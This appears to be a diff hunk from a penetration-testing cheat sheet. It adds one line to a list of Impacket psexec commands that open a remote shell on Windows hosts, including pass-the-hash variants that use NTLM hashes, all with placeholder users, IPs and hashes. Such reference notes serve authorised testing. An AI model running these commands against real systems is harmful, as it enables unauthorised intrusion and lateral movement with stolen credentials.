@@ -6726,6 +6726,7 @@ python psexec.py USER@IP
 impacket-psexec administrator@IP
 psexec USER@IP -hashes :HASH_NT
 impacket-psexec -hashes 00000000000000000000000000000000:HASH USER@IP
+impacket-psexec -hashes :HASH USER@IP
 psexec WORKGROUP/USER@PIP cmd.exe
 impacket-psexec WORKGROUP\username@IP cmd.exe
 ```
